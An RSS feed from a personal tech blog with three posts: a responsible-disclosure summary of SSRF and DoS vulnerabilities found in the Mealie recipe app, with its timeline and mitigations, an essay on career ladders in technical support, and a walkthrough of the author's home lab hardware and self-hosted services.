<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://www.maclaren.dev/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Tue, 09 Apr 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://www.maclaren.dev/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Cooking up some more CVEs</title><link>https://www.maclaren.dev/posts/2024-04/mealie/</link><pubDate>Tue, 09 Apr 2024 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2024-04/mealie/</guid><description>Unlike state secrets, I don&amp;rsquo;t want my brisket recipes to wind up in a Florida bathroom As a follow up to the last time I wrote about CVEs, I&amp;rsquo;ve amassed a few more to my name:
CVE-2024-29191 CVE-2024-29192 CVE-2024-29193 CVE-2024-31991 CVE-2024-31992 CVE-2024-31993 CVE-2024-31994 The first three of these are related to go2rtc and are follow-ups from the earlier investigation done with Frigate. These were found in collaboration with Jorge Rosillo from GitHub Security Lab, and I recommend taking a read through the advisory article for details on these.</description><content type="html"><![CDATA[<h1 id="unlike-state-secrets-i-dont-want-my-brisket-recipes-to-wind-up-in-a-florida-bathroom">Unlike state secrets, I don&rsquo;t want my brisket recipes to wind up in a Florida bathroom</h1>
<p>As a follow up to <a href="https://www.maclaren.dev/posts/2023-12/2023/#i-found-some-vulnerabilities-and-got-some-cves-credited-to-me">the last time I wrote about CVEs</a>, I&rsquo;ve amassed a few more to my name:</p>
<ul>
<li>CVE-2024-29191</li>
<li>CVE-2024-29192</li>
<li>CVE-2024-29193</li>
<li>CVE-2024-31991</li>
<li>CVE-2024-31992</li>
<li>CVE-2024-31993</li>
<li>CVE-2024-31994</li>
</ul>
<p>The first three of these are related to <code>go2rtc</code> and are follow-ups from the earlier investigation done with <a href="https://github.blog/2023-12-13-securing-our-home-labs-frigate-code-review/">Frigate</a>. These were found in collaboration with <a href="https://github.com/jorgectf">Jorge Rosillo</a> from GitHub Security Lab, and I recommend taking a read through <a href="https://securitylab.github.com/advisories/GHSL-2023-205_GHSL-2023-207_go2rtc/">the advisory article</a> for details on these.</p>
<p>In this article, I&rsquo;ll focus on the findings related to <a href="https://mealie.io/">Mealie</a>. While these are lower severity than those that I/we found in Frigate &amp; go2rtc, they ecompass Denial of Service (DoS), Server Side Request Forgery (SSRF), and local file inclusion.</p>
<h1 id="what-did-i-find">What did I find?</h1>
<p>I want to start off by reassuring the Mealie users out there that the following mitigations are/were feasible to mitigate these findings regardless of the version of Mealie in use:</p>
<ul>
<li>If your instance is only exposed to your intranet, you&rsquo;re already reasonably secure</li>
<li>If your instance is exposed to the internet, but segregated from your internal network, the SSRF findings do not affect you</li>
<li>If neither of the above are the case, but you disabled signups <em>and</em> you disabled the default account (enabled by default), you&rsquo;re reasonably secure</li>
</ul>
<p>If you&rsquo;re not interested in the details, these were mostly addressed in <a href="https://github.com/mealie-recipes/mealie/pull/3368">this Pull Request</a> and version 1.4.0 (and above) have far more secure defaults than in the past.</p>
<p>The very quick summary of these findings is that a low-privilege user (i.e. generic user account) with access to Mealie is able to:</p>
<ul>
<li>Map and retrieve content from any webserver on any network Mealie has access to (LFI/SSRF - <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N/E:F/RL:O/RC:C/CR:L/IR:X/AR:X/MAV:N/MAC:L/MPR:L/MUI:N/MS:C/MC:H/MI:N/MA:N&amp;version=3.1">CVSS 5.0</a>)
<ul>
<li>Note: Extraction of content retrieval required administrator access or Debug mode.</li>
</ul>
</li>
<li>Perform DoS attacks against the Mealie server (DoS - <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:L/E:F/RL:O/RC:C/CR:X/IR:X/AR:L/MAV:N/MAC:L/MPR:L/MUI:N/MS:C/MC:N/MI:N/MA:L&amp;version=3.1">CVSS 3.8</a>)</li>
<li>Perform DoS attacks against remote web servers due to lack of rate limiting (DoS - <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H/E:F/RL:O/RC:C/CR:X/IR:X/AR:M/MAV:N/MAC:L/MPR:L/MUI:N/MS:C/MC:N/MI:N/MA:L&amp;version=3.1">CVSS 4.7</a>)</li>
</ul>
<p>Note that the DoS vectors here do not permit any sort of amplication, and are purely volumetric in nature. Without critical mass of compromised Mealie servers, the impact is primarily focused on the Mealie servers themselves.</p>
<h1 id="timeline">Timeline</h1>
<ul>
<li>Decemeber 15, 2023 - Findings are privately disclosed to Mealie maintainers <a href="https://github.com/mealie-recipes/mealie?tab=security-ov-file#reporting-a-vulnerability">as per their instructions</a> with a noted disclosure date of March 14th, 2024.</li>
<li>January 30, 2024 - An update is requested from the Mealie team.</li>
<li>March 14, 2024 - An <a href="https://github.com/mealie-recipes/mealie/issues/3315">issue</a> is opened in the <a href="https://github.com/mealie-recipes/mealie">Mealie repository</a> requesting an update to avoid disclosure of actively exploitable vulnerabilities.</li>
<li>March 15, 2024 - Mealie maintainers respond and request extension of disclosure timeline to March 25th.</li>
<li>March 25, 2024 - An update is requested from the Mealie team.</li>
<li>April 3rd, 2024 - Pull Request <a href="https://github.com/mealie-recipes/mealie/pull/3368">3368</a> is merged, and version 1.4.0 is released containing fixes.</li>
<li>April 9th,  2024 - Public disclosure of these findings &amp; CVE assignment.</li>
</ul>
<h1 id="what-should-i-do-if-im-running-mealie">What should I do if I&rsquo;m running Mealie?</h1>
<ul>
<li>Put it behind an authentication proxy and/or VPN - do not have it publicly exposed to the internet.
<ul>
<li><a href="https://docs.mealie.io/documentation/getting-started/installation/security/">Recommendations from the Mealie team</a></li>
</ul>
</li>
<li>Restrict network access to your internal network. While the latest updates restrict the ability to interact with RFC1918 IP addresses, DNS rebinding is <em>likely</em> still viable.</li>
<li>Disable signups and the default account unless you have a very good reason to keep these enabled.</li>
<li>Do <em>not</em> run in a <a href="https://docs.mealie.io/contributors/developers-guide/starting-dev-server/">development setting</a> for normal usage.</li>
<li>Update to version 1.4.0 or above.</li>
</ul>
<h1 id="what-are-the-details">What are the details?</h1>
<p>Rather than reposting a repost of my original reports, you can read through it all on the <a href="https://securitylab.github.com/advisories/GHSL-2023-225_GHSL-2023-226_Mealie/">GitHub Security Lab Advisories site</a>.</p>
<h1 id="any-themes-in-the-findings">Any themes in the findings?</h1>
<p>The very quick summary here is that if you&rsquo;re going to allow users to interact with external resources, you need to be very careful about what you allow them to do. In the case of Mealie, the ability to interact with external resources was a feature, but the lack of rate limiting and the ability to interact with internal resources opened this up to be used as not only a DoS vector (granted, one with limited impact) but also allowed an attacker to map out internal resources.</p>
<p>While neither of these are all that scary compared to some other things that I&rsquo;ve found (like those in <a href="https://securitylab.github.com/advisories/GHSL-2023-190_Frigate/">Frigate</a>, they&rsquo;re all tools that can be used as part of a larger attack. In this case, the SSRF could be used to map out internal resources and the DoS could be used against those resources, Mealie itself, or against an external target.</p>
<p>A lot of folks with homelabs, myself included, are a bit lazy about resource limits on things like docker containers. This is a good reminder that we should be a bit more careful about what we allow our containers to do and where they can connect. A Mealie instance with a multi-gigabit connection and (far too many) CPU cores could be used to amplify a DoS attack against a target, and that&rsquo;s not something that we want to be a part of.</p>
<p>When you&rsquo;re self-hosting any service, be conscious of who has access to it, <em>how it can be accessed</em> (just because you have auth turned on doesn&rsquo;t mean there isn&rsquo;t a bypass), and what <em>that service itself</em> can access. Network segregation is extremely important <em>especially</em> if you&rsquo;re exposing services publicly, even behind a proxy.</p>
<h1 id="closing-thoughts">Closing thoughts</h1>
<p>I&rsquo;ve got two takeaways from this experience.</p>
<p>First off, kudos to the Mealie maintainers for acknowledging and addressing these findings despite being lower in severity. There have been some notable communication gaps, but when we have been able to connect they&rsquo;ve been great to work with. You can find more details about their thoughts <a href="https://github.com/mealie-recipes/mealie/releases/tag/v1.4.0">in the release notes for version 1.4.0</a>. I&rsquo;m supportive of the approach they&rsquo;ve taken to address these - through preventing access to RFC 1918 addresses, and documenting recommendations for rate limiting. These aren&rsquo;t durable mitigations from a product perspective (external DNS/DNS rebinding can bypass the IP restrictions) but when paired with availability of information, more secure defaults, and deployment recommendations I believe these are sufficient.</p>
<p>Secondly, I think the timelines and communication failures around these findings really emphasize the value of formal reporting mechanisms for open source projects like GitLab&rsquo;s <a href="https://docs.gitlab.com/ee/user/project/issues/confidential_issues.html">Confidential Issues</a> and GitHub&rsquo;s <a href="https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability">Private Vulnerability Reports</a>. Email is archaic, and incredibly easy to miss. It&rsquo;s telling that the first response I received from an otherwise active team of maintainers only came after I opened an issue in the GitHub repository asking for an update.</p>
<p>To be extremely clear, the above statement is not attempting to speak negatively of Mealie&rsquo;s maintainers. The intent is to demonstrate the unreliability of email for anything requiring attention. As a maintainer, please make use of the tools freely available to you&hellip; and feel free to reach out to me if you want a run down on how to use GitHub&rsquo;s Private Vulnerability Reports!</p>
]]></content></item><item><title>Is Support actually a dead-end?</title><link>https://www.maclaren.dev/posts/2024-02/deadend/</link><pubDate>Sat, 24 Feb 2024 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2024-02/deadend/</guid><description>Career laddering in Support I saw a really interesting post on LinkedIn the other day from Brian Levine talking about how support is a &amp;ldquo;dead-end&amp;rdquo; job.
The premise of his article was effectively that in many companies Support is often seen as entry level, with no possible advancement in the organization outside of management. While his proposal discusses laddering up to &amp;ldquo;Senior&amp;rdquo; positions, I find that this may be aiming too low when looking at deeply technical support work like with many &amp;ldquo;enterprise&amp;rdquo; products.</description><content type="html"><![CDATA[<h1 id="career-laddering-in-support">Career laddering in Support</h1>
<p>I saw a <a href="https://www.linkedin.com/posts/brian-a-levine_support-is-a-dead-end-job-activity-7163609177074851840-fdcn">really interesting post on LinkedIn</a> the other day from Brian Levine talking about how support is a &ldquo;dead-end&rdquo; job.</p>
<p>The premise of his article was effectively that in many companies Support is often seen as entry level, with no possible advancement in the organization outside of management. While his proposal discusses laddering up to &ldquo;Senior&rdquo; positions, I find that this may be aiming too low when looking at deeply technical support work like with many &ldquo;enterprise&rdquo; products.</p>
<p>Granted, my view on this is a bit biased from having hit the &ldquo;Senior&rdquo; ceiling at two different companies in Support organizations (IBM and GitHub), however where Brian and I differ on this is that I don&rsquo;t think having a ceiling as an IC in Support is necessarily a bad thing&hellip;</p>
<h1 id="what-have-other-companies-done">What have other companies done?</h1>
<p>There are a few companies out there that have Support tracks leading up significantly more senior levels (&ldquo;Staff+&rdquo; in industry terms), and two examples of these are Elastic and GitLab. From speaking with folks at both companies, the more senior you are the more your responsibilities align (in some cases directly) with engineering or management roles. Certainly, from reading through <a href="https://handbook.gitlab.com/handbook/support/engineering/staff/">GitLab&rsquo;s job description</a> for a Staff Support Engineer, this reads almost exactly like a Team Lead/Manager role, minus formal people management responsibilities. For what it&rsquo;s worth, I don&rsquo;t find this surprising as it&rsquo;s exactly the reason that many Support organizations don&rsquo;t bother with advancement opportunities to that level. When you start mixing management or TPM responsibilities into an otherwise engineering-focused role you wind up with both being done poorly, or at least two jobs that would better be done by two focused parties.</p>
<p>What really stands out here is that Elastic&rsquo;s role is more engineering focused, however there&rsquo;s little to no public information available on this so I&rsquo;m drawing some conclusions from discussions with engineers there. In short, it sounds like they&rsquo;re more in line with &ldquo;traditional&rdquo; L3 support - engineers that have a support rotation for escalations and/or specific critical issues. This was certainly a common approach in IBM when I worked there, and it worked <em>extremely poorly</em>. The engineers in those roles were never able to reliably deliver on <em>both</em> their support obligations (escalations would linger for months) and their engineering responsibilities, and more often than not they were more heavily incentivized to focus on their engineering obligations. While that may sound like the opposite of what you&rsquo;d expect, I want to throw some ideas around as to why that&rsquo;s the case, and why I think anything beyond extremely tactical &ldquo;Staff-ish&rdquo; level roles in Support are not common or <em>needed</em>.</p>
<h1 id="impact">Impact</h1>
<p>Let&rsquo;s assume, for a moment, that your Support organization has roles going all the way up to &ldquo;Principal&rdquo; or two levels beyond &ldquo;Senior&rdquo; (Senior -&gt; Staff -&gt; Principal). What are you expecting out of a Principal Engineer in your organization?</p>
<p>As a Principal, are you dictating how day to day operations can be improved? That feels like a significant amount of management-track overlap as operational effectiveness is their raison d&rsquo;Ãªtre.</p>
<p>Are you helping steer product direction? I&rsquo;d argue this is the role of everyone in support, but beyond a certain point does it make sense to just pivot to being a product owner?</p>
<p>Are you directly making product improvements? I want to focus on this one for a moment as this tends to be where I&rsquo;ve seen the most focus. My argument <em>against</em> this is that someone with a skillset enabling that type of work is already in a position where they&rsquo;d be better serving their peers and their company in an engineering-focused role since the work they&rsquo;re capable of can have significant impact beyond the scope of the Support organization. With that said, if a Support organization is designed to be very closely integrated with Engineering (or directly part of it) I do see this being viable (ala &ldquo;old school&rdquo; L3 support) however this comes with caveats discussed earlier in this article.</p>
<h1 id="what-are-some-other-options">What are some other options?</h1>
<p>Another scenario I&rsquo;ve seen that does remain somewhat directly Support-aligned is &ldquo;Supportability Engineering&rdquo; which is effectively an engineering team focused specifically on addressing customer pain points or critical bugs.</p>
<p>The challenge I&rsquo;ve seen with this team across several companies is that they&rsquo;re wholly a cost-center so they can be very hard to justify, especially as it has direct overlap with work that engineering teams should already be responsible for. Another concern here is that the immediately inherited technical debt can be crushing, and still require extensive collaboration with otherwise-owning engineering teams to progress due to domain specific knowledge requirements.</p>
<p>I&rsquo;d suggest a &ldquo;Supportability Engineering&rdquo; approach is probably the most realistic for many companies if they want to adopt a Support-specific upwards ladder, but at the same time it&rsquo;s such a grey area that it almost feels like putting a new coat of paint on an engineering position and calling it support.</p>
<p>Another opportunity for those interested in a less/non-technical path is to move into something like a Customer Success role. These often have some level of technical knowledge requirements, but are far more focused on relationship building and business problem solving. As they&rsquo;re inherently a revenue generating role, defining your impact can often be as easy as pointing to numbers, and you can focus your projects on amplifying those numbers rather than some of the more nebulous metrics like &ldquo;ticket avoidance&rdquo;.</p>
<h1 id="so-what-do-you-suggest">So what do you suggest?</h1>
<p>I think the &ldquo;dead-end&rdquo; comment is click-bait, to be honest. Sure, Support in most companies has a very hard ceiling <em>for that specific path</em>, however that&rsquo;s true of any number of jobs across any number of industries.</p>
<p>Support is an outstanding foot in the door for a company as it lets you learn about nearly every aspect of its operations, and critically it gives you direct exposure to real world usage of whatever product you&rsquo;re supporting.</p>
<p>If you&rsquo;re moving into a Support role for the first time, or reaching the &ldquo;top of the ladder&rdquo; in your organization, I encourage you to understand what other roles are available for you to progress into that will not only increase the height of that ladder, but allow you to utilize the skills and knowledge that you&rsquo;ve built to accelerate your progress there even more rapidly.</p>
<p>Having &ldquo;recently&rdquo; (nearly two years ago) made the move out of a Support organization into an engineering role, I can say without hesitation that the knowledge and skills I built in support were <em>fully</em> transferable over to my new role and gave me a massive advantage in terms of knowledge around how the company and product works that even veterans in my organization don&rsquo;t have. Obviously I do not have all of the domain specific knowledge I need, but I&rsquo;m now part of an organization that has a career path up to a &ldquo;Distinguished Engineer&rdquo; level and I&rsquo;ve got all the building blocks I need to progress further.</p>
<h1 id="churn">Churn</h1>
<p>The biggest concern brought up by Brian&rsquo;s article is that of knowledge loss as a result of churn out of the Support organization. I want to take this a step further and say that if that knowledge remains in the company (e.g. an individual moves into a non-Support role but remains with the company) that&rsquo;s almost an ideal outcome. The goal here needs to be retaining those individuals within the company, not specifically within Support, especially if the work they can do elsewhere can improve the experience for Support and customers alike.</p>
<p>From my own experience, those who move from Support to other organizations often tend to keep an eye on Support-related matters (technical ones, at least) and it tends to be quite easy to &ldquo;nerd snipe&rdquo; them as they know how challenging the role and its associated problems can be. This creates little, informal, feedback loops between customers, Support, and Engineering organizations in ways that otherwise would likely never happen.</p>
<p>If you&rsquo;re the manager of an engineer who you find gets &ldquo;nerd sniped&rdquo; by Support on a regular basis I recommend not only celebrating that, but making sure that you can capitalize on the feedback that your team is getting from it. Is there information coming through that channel that will allow you to better prioritize your upcoming work, or at the very least have discussions with the PM for your product to get a deeper understanding of how to avoid these problems? At the end of the day, these problems will likely land with your team through formal means (which you can still direct your snipee to request) so this likely isn&rsquo;t something that&rsquo;s eating up unexpected time.</p>
<h1 id="closing-thoughts">Closing thoughts</h1>
<p>I&rsquo;ll leave it with this question for now - as you explore more senior levels (let&rsquo;s say &ldquo;Staff+&quot;) within your Support organization, what do you see their role being? How are they having an impact that justifies that leveling better than moving those seeking promotion to other areas of the company?</p>
]]></content></item><item><title>State of the Lab (late 2023)</title><link>https://www.maclaren.dev/posts/2023-12/lab_updates/</link><pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2023-12/lab_updates/</guid><description>Didn&amp;rsquo;t you just blog that this was going to be a 2024 project? Or, more specifically, I got a bit too excited after writing the last post and some hardware I was eyeing up went on sale. Since this update is happening today (hopefully) I figured this might be a good time to finally do a full walkthrough of what hardware and services I&amp;rsquo;m running.
The hardware Old &amp;amp; busted As noted, I&amp;rsquo;m finally replacing my venerable home server.</description><content type="html"><![CDATA[<h1 id="didnt-you-just-blog-that-this-was-going-to-be-a-2024-project">Didn&rsquo;t you just blog that this was going to be a 2024 project?</h1>
<p><img src="https://c.tenor.com/lZkfdEToSHEAAAAC/tenor.gif" alt=""></p>
<p>Or, more specifically, I got a bit too excited after writing the last post and some hardware I was eyeing up went on sale. Since this update is happening <em>today</em> (hopefully) I figured this might be a good time to finally do a full walkthrough of what hardware and services I&rsquo;m running.</p>
<h1 id="the-hardware">The hardware</h1>
<h2 id="old--busted">Old &amp; busted</h2>
<p>As noted, I&rsquo;m finally replacing my venerable home server. The current (former) &ldquo;server&rdquo; is an i7 4770k with 32GB of RAM, a 256GB SATA SSD, a 1TB SATA SSD, and a RAID-1 array of 1TB spinning rust. It is old, but it has worked remarkably well over the past few years. With that noted, as I venture more into the security research space and my desire to host more services at home grows, the core count and 32GB limit of the platform has started to become a limiting factor. This machine is still extremely capable, and will probably turn into an emulation box/HTPC in its next life, albeit with the RAID array removed.</p>
<h2 id="new-hotness">New hotness</h2>
<p>The new &ldquo;server&rdquo; is a Beelink SER5 with a Ryzen 5800H, 64GB RAM, a 500GB NVMe drive, and I&rsquo;ll be porting over the 1TB SSD from the previous build. This build nearly doubles the per-thread performance compared to the 4770k, while doubling the core/thread count, and doubling the RAM. A larger SSD may be needed in the long run, but the current 1TB will only be about half utilized with my current needs.</p>
<h2 id="the-complete-hardware-stack">The complete hardware stack</h2>
<ul>
<li>Beelink SER5 mini-PC</li>
<li>Synology DS918 NAS</li>
<li>CyberPower CP1500AVRLCD UPS</li>
</ul>
<p>Yep, that&rsquo;s it. I had considered getting several of the Beelink boxes to run Proxmox in an HA or cluster configuration, but I simply don&rsquo;t have the need nor do I want the additional headache and cost of running a separate storage plane.</p>
<p>The UPS is nothing special. Even with the current power draw, this can power my entire stack for about 30 minutes. With the existing server shut down that extends to nearly an hour, and I expect it to land around the 45 minute mark after the Beelink box is up and running to replace the power-hog that is the current i7-based server.</p>
<h2 id="the-network-stack">The network stack</h2>
<p>This is where there&rsquo;s a bit more going on. Across my home, which is by no means large, I have an assortment of smart devices (Fire TVs, Chromecasts, etc), a few dozen IoT devices (cameras, outlets, etc), 5 actively used compupters, and a plethora of other devices. As I also work from home, network reliability is very important to me, as is the ability to segregate traffic on my network.</p>
<h3 id="network-hardware">Network hardware</h3>
<ul>
<li>UniFi Dream Machine</li>
<li>DLink 24-port unmanaged Gigabit switch</li>
<li>DLink 5-port unmanaged Gigabit switch</li>
<li>TP-Link 5-port unmanaged Gigabit PoE switch</li>
<li>2x UniFi U6 Pro APs</li>
<li>1x UniFi Nano-AC AP</li>
<li>1x UniFi AC Mesh AP</li>
<li>goCoax MoCA 2.5 Adapter</li>
</ul>
<p>The AC Mesh AP services my backyard since it is outdoor rated, and the other APs are spread through the garage (Nano AC) and floors (U6 Pros) of my house. Overall this means that I&rsquo;ve got pretty much &ldquo;full speed&rdquo; WiFi coverage anywhere on my (quite small) property. I went with Ubiquiti UniFi gear for most of this due to the simplicity of setting it up and, in my experience, the relatively reliability of it without the management overhead of something like MikroTik.</p>
<p>The switches in the network are all &ldquo;dumb&rdquo;. While I do plan to upgrade the main 24-port switch that acts as backhaul for everything over to a UniFi PoE switch this year, I have limited need for network segregation on the physical level. I maintain  &ldquo;Prod&rdquo;, IOT, and guest networks on my LAN, however IOT and Guest networks are WiFi only at this time. While I&rsquo;d love to have some more wired opportunities, my house lacks cabling to support it, and this is partially where the MoCA adapter has come in.</p>
<p>Since I don&rsquo;t have in-wall ethernet wiring, and realistically I don&rsquo;t see the value in tearing open my walls to add it, I&rsquo;ve opted to handle my network backhaul between floors over coax. I was a bit reluctant to do this initially, hearing concerns about the added latency, single duplex nature, etc&hellip; however in practice this hasn&rsquo;t been an issue. Yes, there&rsquo;s an added 2-3ms of latency, but I&rsquo;m unable to saturate the link this gives me and I don&rsquo;t foresee a usecase where I need &gt; 2.5GbE between floors for quite a while. This will come eventually, but isn&rsquo;t a priority right now.</p>
<p>Near-term I&rsquo;ll <em>likely</em> be picking up a UniFi 16 port Gigabit switch, an unmanaged 8 port PoE switch, and likely another 5 port unmanaged DLink switch. The TP-Link switch I bought is unfortunately faulty, with only 3 working ports, so I&rsquo;m hoping to replace that and remove my need for PoE injectors entirely. These will probably be spring/summer upgrades, and something I need to be cost-conscious on.</p>
<h1 id="the-software">The software</h1>
<p>Obviously the network software goes without saying, so I&rsquo;m going to focus on detailing the services I&rsquo;m running on my Server &amp; NAS, and why I&rsquo;ve chosen them.</p>
<p>To start off with, I run virtually everything in Docker containers. I wrote about this <a href="https://www.maclaren.dev/posts/2021-11/home_lab_updates/#so-what-am-i-doing-with-all-these-toys">back in 2021</a> but the reduced management requirement &amp; significantly reduced resource utilization of running services in containers over individual VMs has been a god-send in terms of making the most of my hardware. With this noted, I do run a number of VMs, and in fact these were a driving force behind the in-progress server replacement.</p>
<h2 id="vms">VMs</h2>
<p>As noted, I do run several VMs, and one notable change with the rebuild is that I&rsquo;ll be virtualizing my current server in its entirety since I&rsquo;ll be running Proxmox on the new host:</p>
<ul>
<li>Containers (Ubuntu Server)</li>
<li>Ansible (Ubuntu Server)</li>
<li>3 Linux sandbox VMs (Ubuntu Server)</li>
<li>Kali (Debian-based)</li>
<li>Windows 10</li>
<li>Windows 11</li>
</ul>
<p>Breaking these down a little further, let&rsquo;s talk about the uses cases.</p>
<h3 id="ubuntu-server">Ubuntu Server</h3>
<p>While I&rsquo;m not the biggest fan of Cannonical&rsquo;s decisions or ways they do business, there&rsquo;s something to be said for having a homogenous setup internally, and in my expericen Ubuntu comes with fewer (or perhaps, different) headaches compared to running straight Debian. This also simplifies my update processes since all of my managed Linux endpoints are using <code>apt</code> for package management.</p>
<h3 id="container-vm">Container VM</h3>
<p>This is effectively virtualizing my existing server. Since Proxmox will handle the hypervisor layer for me, I don&rsquo;t really want to also run my containers on bare metal if I don&rsquo;t need to. This will be home to many services running in Docker (eventually Podman, maybe) and ideally little to nothing else.</p>
<h3 id="ansible-vm">Ansible VM</h3>
<p>I use Ansible to enforce various configurations across my servers as well as to manage updates, TLS certificate renewal, and some backups. Right now this is managing all of my VMs, but may be expanded out to my physical nodes in the future.</p>
<p>Reasonably typical usecase here, and I like having this on its own VM for logical segregation, though I wish Ansible didn&rsquo;t require unfettered root access (via <code>become</code> to operate). I maintain all of my playbooks <a href="https://github.com/maclarel/ansible_playbooks">on GitHub</a> for ease of version control and development.</p>
<h3 id="sandbox-vms">Sandbox VMs</h3>
<p>These don&rsquo;t have dedicated use right now, and are mostly for tinkering with my Ansible playbooks. Now that I have more robust hardware, these may end up as a layer to experiment with K3s, however it&rsquo;s more likely that these will host whatever services I am poking at for vulnerability research since I don&rsquo;t necessarily want those running on &ldquo;prod&rdquo; hosts.</p>
<h3 id="kali-vm">Kali VM</h3>
<p>I work in the security space and Kali is a great tool. While the packages it comes with can be installed pretty much anywhere, and I have most on my other machines, I&rsquo;ve found having the VM to be exceptionally useful. I do not leave my main PC powered on, and my laptop is a work-managed endpoint, so having a machine dedicated to tooling that would otherwise set off work-related alarm bells is extremely helpful when I&rsquo;m on the road or otherwise don&rsquo;t want to physically leave my work setup.</p>
<h3 id="windows-vms">Windows VMs</h3>
<p>I need these for work as well as vulnerability testing. In short, I work with a lot of client-side applications, so these are important testbeds for me despite not using Windows personally or professionally in any other capacity.</p>
<h2 id="containers">Containers</h2>
<h3 id="ddclienthttpsdocslinuxserverioimagesdocker-ddclient"><a href="https://docs.linuxserver.io/images/docker-ddclient/">ddclient</a></h3>
<p><code>ddclient</code> handles Dynamic DNS for me, updating a record under my domain that allows me to remote back in to my home network via Wireguard without the need (or ability) to have a static IP from my ISP.</p>
<h3 id="wyze-bridgehttpsgithubcommrlt8docker-wyze-bridge"><a href="https://github.com/mrlt8/docker-wyze-bridge">Wyze Bridge</a></h3>
<p>I use Wyze &ldquo;security&rdquo; cameras around my property. Like the rest of the IoT devices, these live on their own network, and similarly are only outdoor-facing to minimize exposure for when Wyze repeats the same mistakes that seem to plague all camera vendors and share my cameras to someone else.</p>
<p>The Wyze Bridge service integrates with the Wyze API and transforms the camera streams into RTSP. While Wyze does offer some form of RTSP firmware, it&rsquo;s not supported, and it has several caveats. This keeps my exiting functionality fully intact, while also giving me easy local access to my camera feeds in a browser or when integrated through another service.</p>
<p>I&rsquo;d like to pull these feeds into Frigate at some point, however I&rsquo;ve had some massive performance problems with Frigate in the past, and also having <a href="https://github.blog/2023-12-13-securing-our-home-labs-frigate-code-review/">some significant concerns with its security model</a>.</p>
<h3 id="homepagehttpsgithubcomgethomepagehomepage"><a href="https://github.com/gethomepage/homepage">Homepage</a></h3>
<p>Homepage does what it says on the tin. I use this as a landing page for everything I run internally. A one-stop shop for all the links I need, weather, and search. The default location for all of my new browser tabs.</p>
<h3 id="jellyfinhttpsjellyfinorg"><a href="https://jellyfin.org/">Jellyfin</a></h3>
<p>An open source Plex replacement, Jellyfin allows me to stream my thousands of hours of &ldquo;Linux ISOs&rdquo; to my client devices. Great for audio and video, no complaints!</p>
<h3 id="joplinhttpsgithubcomlaurent22joplin"><a href="https://github.com/laurent22/joplin">Joplin</a></h3>
<p>Joplin is a note taking app that supports Markdown and gives me the ability to store all of my data locally on my network, encrypted at rest and in transit, and still support syncing with all of my mobile devices as long as they have network connectivity to the server (via VPN or otherwise). While it&rsquo;s not as powerful as something like Notion, the ability to encrypt and store all of my notes locally is very important to me since this is also used for work purposes.</p>
<h3 id="mealiehttpsgithubcommealie-recipesmealie"><a href="https://github.com/mealie-recipes/mealie">Mealie</a></h3>
<p>Mealie is a new addition to my list of services, but in short its a cookbook where I can either scrape websites for recipe information or I can enter it myself. Very useful as I experiment with different techniques when cooking barbeque!</p>
<h3 id="nginxhttpsnginxorgen"><a href="https://nginx.org/en/">Nginx</a></h3>
<p>This doesn&rsquo;t need any introduction to the audience reading this blog, but in short I use Nginx as both a web server and reverse proxy to give me a TLS front-end for all of my containers.</p>
<p>To that end, virtually all of my services do not offer (or at least not trivially) out-of-the-box support for TLS, so proxying access is quite important. To accomplish this, most of my containers have their network ports only exposed to <code>127.0.0.1</code> and I then &ldquo;publicly&rdquo; (to my network) expose those as TLS-enabled endpoints through Nginx.</p>
<p>I&rsquo;m aware that Nginx Proxy Manager exists, however I also use Nginx professionally so I see great value in digging into all of this manually and in some cases <a href="https://github.com/mrlt8/docker-wyze-bridge/issues/989#issuecomment-1763431176">this greatly simplifies troubleshooting</a>.</p>
<h3 id="piholehttpspi-holenet"><a href="https://pi-hole.net/">PiHole</a></h3>
<p>This is my ad-blocker of choice for my network, and also handles local DNS records (managed through Ansible as well). I also run this in a container on my Synology NAS so that I&rsquo;ve got failover in the event that either host goes down.</p>
<h3 id="portainerhttpswwwportainerio"><a href="https://www.portainer.io/">Portainer</a></h3>
<p>This one is an experiment. On paper, Portainer gives me a level of management for my Docker Compose stacks, however I&rsquo;ve found that with the free version there are many limitations on things that are otherwise trivial for me to do via SSH or through Ansible (e.g. updating all stacks to pull the latest images). Not sure if this will stick around, but we will see!</p>
<h3 id="qbittorrent--wireguard">QBittorrent &amp; Wireguard</h3>
<p>This is a bespoke setup where I&rsquo;m running <a href="https://github.com/linuxserver/docker-qbittorrent">QBitTorrent</a> with its networking routed through a Wireguard container connecting to my VPN of choice. No one needs to know that I secretly download SUSE Linux ISOs&hellip;</p>
<h3 id="searxnghttpsgithubcomsearxngsearxng"><a href="https://github.com/searxng/searxng">SearXNG</a></h3>
<p>SearX (or SearXNG in this case) is an anonymized search aggregator. In short, this gives me results from my search engines of choice, but performs those searches in a form that can&rsquo;t be tied back to an individual (beyond an IP address) and as such helps get rid of a significant amount of tracking, ad personalization, etc.</p>
<p>The quality of results, unfortunately, does suffer from this but I find the privacy tradeoffs to be conceptually worthwhile.</p>
<h3 id="wireguardhttpsgithubcomlinuxserverdocker-wireguard"><a href="https://github.com/linuxserver/docker-wireguard">Wireguard</a></h3>
<p>And last, but absolutely not least, I run Wireguard in a container. This is mostly <a href="https://www.maclaren.dev/posts/2022-09/bell_udm/#wireguard">to deal with some bizarre limitations with how Ubiquiti implements their own VPN solutions</a>, but it&rsquo;s aslo nice knowing that I&rsquo;ve got more complete control over how it all works.</p>
<p>Unlike UniFi software, I also don&rsquo;t mind publicly exposing Wireguard as an endpoint.</p>
<h1 id="whats-next">What&rsquo;s next?</h1>
